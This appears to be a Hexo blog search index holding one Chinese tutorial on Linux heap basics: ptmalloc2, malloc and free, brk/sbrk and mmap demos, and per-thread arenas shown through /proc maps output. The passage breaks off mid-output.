<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>堆</title>
      <link href="/2025/06/10/%E5%A0%86/"/>
      <url>/2025/06/10/%E5%A0%86/</url>
      
        <content type="html"><![CDATA[<h1 id="堆概述"><a href="#堆概述" class="headerlink" title="堆概述"></a>堆概述</h1><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>在程序运行过程中，堆可以提供动态分布的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。我们一般称管理堆的那部分程序为堆管理器。</p><blockquote><p>堆管理器处于用户程序与内核中间，主要做以下工作：</p><p>1.响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序，同时为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。</p><p>2.管理用户所释放的内存。一般来说用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存请求。</p></blockquote><p>Linux 中早期的堆分配与回收由 Doug Lea 实现，但它在并行处理多个线程时，会共享进程的堆内存空间。因此，为了安全性，一个线程使用堆时，会进行加锁。然而，与此同时，加锁会导致其它线程无法使用堆，降低了内存分配和回收的高效性。同时，如果在多线程使用时，没能正确控制，也可能影响内存分配和回收的正确性。Wolfram Gloger 在 Doug Lea 的基础上进行改进使其可以支持多线程，这个堆分配器就是 ptmalloc 。在 glibc-2.3.x. 之后，glibc 中集成了 ptmalloc2。</p><p>目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc&#x2F;free 函数来分配和释放内存块。</p><p>需要注意的是，在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p><h2 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h2><p>这里我们主要介绍</p><ul><li>基本的堆操作，包括堆的分配，回收，堆分配背后的系统覅用</li><li>介绍堆目前的多线程支持</li></ul><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>在 glibc 的 <a href="https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L448">malloc.c</a> 中，malloc 的说明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span></span><br><span class="line"><span class="comment">  if no space is available. Additionally, on failure, errno is</span></span><br><span class="line"><span class="comment">  set to ENOMEM on ANSI C systems.</span></span><br><span class="line"><span class="comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span></span><br><span class="line"><span class="comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span></span><br><span class="line"><span class="comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span></span><br><span class="line"><span class="comment">  with negative arguments are interpreted as requests for huge amounts</span></span><br><span class="line"><span class="comment">  of space, which will often fail. The maximum supported value of n</span></span><br><span class="line"><span class="comment">  differs across systems, but is in all cases less than the maximum</span></span><br><span class="line"><span class="comment">  representable value of a size_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>可以看出，malloc 函数返回对应大小字节的内存块的指针。此外，该函数还对一些异常情况进行了处理</p><ul><li>当 n&#x3D;0 时，返回当前系统允许的堆的最小内存块。</li><li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li></ul><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><p>在 glibc 的 <a href="https://github.com/iromise/glibc/blob/master/malloc/malloc.c#L465">malloc.c</a> 中，free 的说明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  malloc(size_t n)</span></span><br><span class="line"><span class="comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span></span><br><span class="line"><span class="comment">  if no space is available. Additionally, on failure, errno is</span></span><br><span class="line"><span class="comment">  set to ENOMEM on ANSI C systems.</span></span><br><span class="line"><span class="comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span></span><br><span class="line"><span class="comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span></span><br><span class="line"><span class="comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span></span><br><span class="line"><span class="comment">  with negative arguments are interpreted as requests for huge amounts</span></span><br><span class="line"><span class="comment">  of space, which will often fail. The maximum supported value of n</span></span><br><span class="line"><span class="comment">  differs across systems, but is in all cases less than the maximum</span></span><br><span class="line"><span class="comment">  representable value of a size_t.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>可以看出，free 函数会释放由 p 所指向的内存块。这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。</p><p>此外，该函数也同样对异常情况进行了处理</p><ul><li><strong>当 p 为空指针时，函数不执行任何操作。</strong></li><li>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 <code>double free</code>。</li><li>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。</li></ul><h3 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h3><p>在前面提到的函数中，无论是 malloc 函数还是 free 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数。这些函数背后的系统调用主要是 <a href="http://man7.org/linux/man-pages/man2/sbrk.2.html">(s)brk</a> 函数以及 <a href="http://man7.org/linux/man-pages/man2/mmap.2.html">mmap, munmap</a> 函数。</p><p>如下图所示，我们主要考虑对堆进行申请内存块的操作。</p><p><img src="/../images/%E5%A0%86/Snipaste_2025-06-10_11-08-50.png" alt="1"></p><h4 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h4><p>对于堆的操作，操作系统提供了brk函数，glibc库提供了sbrk函数，我们可以通过增加brk的大小来向操作系统申请内存</p><p>初始时，堆的起始地址<code>start_brk</code>以及堆的当前末尾<code>brk</code>指向同一地址。根据是否开启ASLR，两者的具体位置会有所不同</p><ul><li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data&#x2F;bss 段的结尾。</li><li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data&#x2F;bss 段结尾后的随机偏移处。</li></ul><p>具体效果如下图：</p><p><img src="/../images/%E5%A0%86/Snipaste_2025-06-10_11-54-13.png" alt="1"></p><p>接下来实际操作来深入理解通过改变brk的大小来分配或释放堆</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sbrk and brk example */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">void</span> *curr_brk, *tmp_brk = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to sbrk example:%d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* sbrk(0) gives current program break location */</span></span><br><span class="line">        tmp_brk = curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location1:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* brk(addr) increments/decrements program break location */</span></span><br><span class="line">        brk(curr_brk+<span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program break Location2:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        brk(tmp_brk);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location3:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该程序用于演示程序如何手动控制 <strong>“程序中断点（Program Break）”</strong>（堆内存的边界），理解堆内存动态分配的底层原理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curr_brk：记录当前程序中断点地址。</span><br><span class="line">tmp_brk：临时保存初始中断点地址，用于后续恢复。</span><br><span class="line">sbrk(0) 作用：返回当前程序中断点的地址（堆内存的 “边界”，堆向上生长的终点）。</span><br><span class="line">getpid()：获取当前进程 ID，方便调试时区分不同进程。</span><br><span class="line">brk 函数作用：手动设置程序中断点的位置。传入新地址 curr_brk+4096 表示扩展堆内存</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要注意的是，在每一次执行完操作后，都执行了 getchar() 函数，这是为了我们方便我们查看程序真正的映射。</p><p>gcc编译链接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o sbrk sbrk.c</span><br></pre></td></tr></table></figure><p>gdb调试sbrk程序观察堆边界变化情况</p><p>这里我们可以通过两种方式来查看内存分配情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vmmap</span><br><span class="line"><span class="built_in">cat</span> /proc/进程号/maps</span><br></pre></td></tr></table></figure><p><strong>在第一次调用brk之前</strong></p><p><img src="/../images/%E5%A0%86/Snipaste_2025-06-10_12-07-10.png" alt="1"></p><p>可以看到并没有出现堆，结合输出可以发现</p><p>start_brk &#x3D; brk &#x3D; end_data &#x3D; 0x555555559000</p><p><strong>调用完第一个printf之后</strong></p><p>出现了堆段，brk &#x3D; 0x5555557a000</p><p><img src="/../images/%E5%A0%86/Snipaste_2025-06-10_12-14-21.png" alt="1"></p><p>觉得应该是在printf函数内部改变了brk的大小</p><p>此时调用sbrk(0)可以发现rax存储了此时的brk</p><p><img src="/../images/%E5%A0%86/Snipaste_2025-06-10_12-16-58.png" alt="1"></p><p>接下来我们尝试将brk变大，来扩展堆内存空间</p><p><strong>扩展</strong></p><p><code>  brk(curr_brk+4096);</code>扩大一页内存</p><p><img src="/../images/%E5%A0%86/Snipaste_2025-06-10_12-19-14.png" alt="1"></p><p>可以看到此时brk变为了0x55555557b000堆空间得到了拓展</p><p>接下来将brk变小释放刚刚扩展的堆空间</p><p><strong>释放</strong></p><p><code> brk(tmp_brk);</code>将brk变回初始的0x55555557a000</p><p><img src="/../images/%E5%A0%86/Snipaste_2025-06-10_12-23-43.png" alt="1"></p><p>可以看到此时brk变为了0x55555557a000刚刚扩展的部分得到了释放</p><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><p>malloc 会使用 <a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L1285">mmap</a> 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。</p><p>同样的我们通过一个程序来深入理解</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Private anonymous mapping example using mmap syscall */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="type">static</span> <span class="keyword">inline</span> <span class="title function_">errExit</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s failed. Exiting the process\n&quot;</span>, msg);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;</span>, getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before mmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="type">char</span>* addr = <span class="literal">NULL</span>;</span><br><span class="line">        addr = mmap(<span class="literal">NULL</span>, (<span class="type">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">                errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After mmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Unmap mapped region. */</span></span><br><span class="line">        ret = munmap(addr, (<span class="type">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">                errExit(<span class="string">&quot;munmap&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After munmap\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc编译链接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o mmap mmap.c</span><br></pre></td></tr></table></figure><p>调用mmap前的内存段</p><p><img src="/../images/%E5%A0%86/Snipaste_2025-06-10_12-40-08.png" alt="1"></p><p>可以看到调用mmap后内存段的变大了</p><p><img src="/../images/%E5%A0%86/Snipaste_2025-06-10_12-36-50.png" alt="1"></p><p>调用munmap后内存段恢复</p><p><img src="/../images/%E5%A0%86/Snipaste_2025-06-10_12-38-34.png" alt="1"></p><h3 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h3><blockquote><p>在原来的 dlmalloc 实现中，当两个线程同时要申请内存时，只有一个线程可以进入临界区申请内存，而另外一个线程则必须等待直到临界区中不再有线程。这是因为所有的线程共享一个堆。在 glibc 的 ptmalloc 实现中，比较好的一点就是支持了多线程的快速访问。在新的实现中，所有的线程共享多个堆。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Per thread arena example. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">threadFunc</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="type">char</span>* addr = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in thread 1\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">pthread_t</span> t1;</span><br><span class="line">        <span class="type">void</span>* s;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        <span class="type">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        addr = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in main thread\n&quot;</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread creation error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = pthread_join(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread join error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>第一次申请之前</strong>， 没有任何任何堆段。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ <span class="built_in">cat</span> /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p><strong>第一次申请后</strong>， 从下面的输出可以看出，堆段被建立了，并且它就紧邻着数据段，这说明 malloc 的背后是用 brk 函数来实现的。同时，需要注意的是，我们虽然只是申请了 1000 个字节，但是我们却得到了 0x0806c000-0x0804b000&#x3D;0x21000 个字节的堆。<strong>这说明虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。</strong>我们称这一块连续的内存区域为 arena。此外，我们称由主线程申请的内存为 main_arena。后续的申请的内存会一直从这个 arena 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加 brk 的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">After malloc and before free <span class="keyword">in</span> main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ <span class="built_in">cat</span> /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p><strong>在主线程释放内存后</strong>，我们从下面的输出可以看出，其对应的 arena 并没有进行回收，而是交由 glibc 来进行管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">After malloc and before free <span class="keyword">in</span> main thread</span><br><span class="line">After free <span class="keyword">in</span> main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ <span class="built_in">cat</span> /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p><strong>在第一个线程 malloc 之前</strong>，我们可以看到并没有出现与线程 1 相关的堆，但是出现了与线程 1 相关的栈。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread</span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc <span class="keyword">in</span> main thread</span><br><span class="line">After malloc and before free <span class="keyword">in</span> main thread</span><br><span class="line">After free <span class="keyword">in</span> main thread</span><br><span class="line">Before malloc <span class="keyword">in</span> thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ <span class="built_in">cat</span> /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0</span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span 